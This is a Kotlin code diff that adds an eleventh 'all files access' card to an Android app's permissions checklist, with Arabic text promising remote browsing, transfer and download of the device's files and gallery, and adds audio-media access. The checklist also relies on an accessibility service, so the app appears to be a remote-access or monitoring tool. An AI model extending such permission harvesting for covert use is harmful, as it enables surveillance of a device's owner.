@@ -282,7 +282,7 @@ class MainActivity : AppCompatActivity() {
         healthCard.addView(healthSummaryView)
 
         healthProgressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
-            max = 10
+            max = 11
             progress = 0
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
@@ -494,7 +494,7 @@ class MainActivity : AppCompatActivity() {
         container.removeAllViews()
 
         var grantedCount = 0
-        val totalCount = 10
+        val totalCount = 11
 
         // 1. Accessibility Service
         val accessOk = isAccessibilityServiceEnabled()
@@ -672,6 +672,35 @@ class MainActivity : AppCompatActivity() {
             }
         ))
 
+        // 11. Storage & Files Access
+        val storageOk = hasAllFilesPermission()
+        if (storageOk) grantedCount++
+        container.addView(buildPermissionCard(
+            title = "11. الوصول إلى الملفات والمعرض (Files & Media Access)",
+            desc = "لتصفح ونقل ملفات الجهاز، استعراض معرض الصور والفيديوهات، ومعاينة وتحميل المستندات عن بُعد.",
+            isGranted = storageOk,
+            actionLabel = "📁 تفعيل الوصول لكافة الملفات",
+            onAction = {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    try {
+                        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+                            data = Uri.parse("package:$packageName")
+                        }
+                        startActivity(intent)
+                    } catch (_: Exception) {
+                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                        startActivity(intent)
+                    }
+                } else {
+                    ActivityCompat.requestPermissions(
+                        this,
+                        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
+                        105
+                    )
+                }
+            }
+        ))
+
         // Update Health Summary Header
         val pct = (grantedCount * 100) / totalCount
         healthProgressBar?.progress = grantedCount
@@ -815,6 +844,14 @@ class MainActivity : AppCompatActivity() {
         return true
     }
 
+    private fun hasAllFilesPermission(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            android.os.Environment.isExternalStorageManager()
+        } else {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+
     private fun requestBatchRuntimePermissions() {
         val perms = mutableListOf<String>()
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -846,6 +883,9 @@ class MainActivity : AppCompatActivity() {
             }
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                 perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+            }
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                perms.add(Manifest.permission.READ_MEDIA_AUDIO)
             }
         } else {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
